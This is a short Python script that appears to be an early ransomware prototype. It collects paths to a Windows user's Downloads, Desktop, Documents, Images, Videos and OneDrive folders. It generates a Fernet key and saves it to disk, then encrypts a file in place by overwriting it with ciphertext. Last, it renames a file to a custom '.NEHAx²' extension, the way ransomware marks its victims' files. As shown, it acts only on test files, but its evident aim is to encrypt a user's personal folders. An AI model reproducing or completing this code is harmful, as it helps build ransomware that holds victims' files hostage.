import os
from pathlib import Path
from cryptography.fernet import Fernet


download  = os.path.normpath(r"%s\Downloads"%(os.environ['USERPROFILE']))
desktop = os.path.normpath(r"%s\Desktop"%(os.environ['USERPROFILE']))
documents = os.path.normpath(r"%s\Documents"%(os.environ['USERPROFILE']))
images = os.path.normpath(r"%s\Images"%(os.environ['USERPROFILE']))
videos = os.path.normpath(r"%s\Videos"%(os.environ['USERPROFILE']))

#try dans   
doc_one_drive = os.path.normpath(r"%s\OneDrive\Documents"%(os.environ['USERPROFILE']))
image_one_drive = os.path.normpath(r"%s\OneDrive\Images"%(os.environ['USERPROFILE']))

#ENCRYPTION
key = Fernet.generate_key()
with open("key.key", "wb") as key_file:
    key_file.write(key)

f_key = Fernet(key)


for filename in os.listdir(image_one_drive):
    f = os.path.join(image_one_drive, filename)
    print(f)
         


with open("test/text-test.txt", "rb") as file:
        # read all file data
        file_data = file.read()
        encrypted_data = f_key.encrypt(file_data)
        with open("test/text-test.txt", "wb") as file:
            file.write(encrypted_data)


#ENCRYPT SUFFIX
p = Path('test/steve.nash')
p.rename(p.with_suffix('.NEHAx²'))
